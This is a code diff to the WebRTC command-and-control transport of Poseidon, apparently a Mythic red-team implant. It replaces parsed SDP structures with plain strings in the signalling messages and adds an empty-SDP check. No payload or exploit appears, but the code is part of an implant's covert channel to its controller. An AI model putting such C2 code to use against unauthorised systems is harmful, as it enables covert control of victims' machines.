@@ -18,7 +18,6 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 
 	"github.com/gorilla/websocket"
-	"github.com/pion/sdp/v3"
 	"github.com/pion/webrtc/v4"
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
@@ -92,13 +91,13 @@ func (e *WebRTCInitialConfig) UnmarshalJSON(data []byte) error {
 }
 
 type webRTCSignalMessage struct {
-	Type        string                 `json:"type"`
-	Destination string                 `json:"destination"`
-	SDP         sdp.SessionDescription `json:"sdp,omitempty"`
-	Candidate   string                 `json:"candidate,omitempty"`
-	AuthKey     string                 `json:"authKey"`
-	AgentUUID   string                 `json:"agentUUID,omitempty"`
-	Data        string                 `json:"data,omitempty"`
+	Type        string `json:"type"`
+	Destination string `json:"destination"`
+	SDP         string `json:"sdp,omitempty"`
+	Candidate   string `json:"candidate,omitempty"`
+	AuthKey     string `json:"authKey"`
+	AgentUUID   string `json:"agentUUID,omitempty"`
+	Data        string `json:"data,omitempty"`
 }
 
 type C2WebRTC struct {
@@ -560,15 +559,10 @@ func (c *C2WebRTC) sendOffer() error {
 		return fmt.Errorf("failed to get local description")
 	}
 
-	var offerSDP sdp.SessionDescription
-	if err := offerSDP.Unmarshal([]byte(offer.SDP)); err != nil {
-		return fmt.Errorf("failed to parse offer SDP: %w", err)
-	}
-
 	offerMessage := webRTCSignalMessage{
 		Type:        "offer",
 		Destination: "answer",
-		SDP:         offerSDP,
+		SDP:         offer.SDP,
 		AuthKey:     c.AuthKey,
 		AgentUUID:   GetMythicID(),
 	}
@@ -649,15 +643,14 @@ func (c *C2WebRTC) processSignalingMessage(msg webRTCSignalMessage, sdpChan chan
 }
 
 func (c *C2WebRTC) handleAnswerMessage(msg webRTCSignalMessage, sdpChan chan webrtc.SessionDescription) bool {
-	sdpBytes, err := msg.SDP.Marshal()
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("Failed to marshal answer SDP: %v", err))
+	if msg.SDP == "" {
+		utils.PrintDebug("Received answer without SDP")
 		return false
 	}
 
 	sdp := webrtc.SessionDescription{
 		Type: webrtc.SDPTypeAnswer,
-		SDP:  string(sdpBytes),
+		SDP:  msg.SDP,
 	}
 
 	sdpChan <- sdp
